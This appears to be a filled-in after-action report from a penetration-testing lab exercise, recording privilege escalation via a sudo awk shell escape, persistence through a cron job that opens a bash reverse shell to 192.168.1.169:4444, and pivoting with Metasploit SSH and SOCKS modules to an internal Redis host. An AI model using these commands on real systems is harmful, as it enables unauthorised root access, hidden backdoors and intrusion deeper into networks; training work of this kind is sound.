# OPERATION DEEP PIVOT: AFTER ACTION REPORT
**Operator:Kevon Priester** ## PHASE 1: PRIVILEGE ESCALATION
* **Initial Access User:** mercenary
* **Vulnerable Sudo Binary:** [/usr/bin/awk]
* **GTFOBins Exploit Command Used:** [sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}]

## PHASE 2: PERSISTENCE
* **Cron Syntax Used:** [* * * * * /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.169/4444 0>&1']
* **Persistence Confirmed:** (Yes)

## PHASE 3: LATERAL MOVEMENT (THE PIVOT)
* **Metasploit Modules Used:** [use auxiliary/scanner/ssh/ssh_login & use auxiliary/server/socks_proxy]
* **Hidden Database IP Discovered:** [10.0.10.50]
* **Open Port on Hidden Database:** [port 6379 redis]
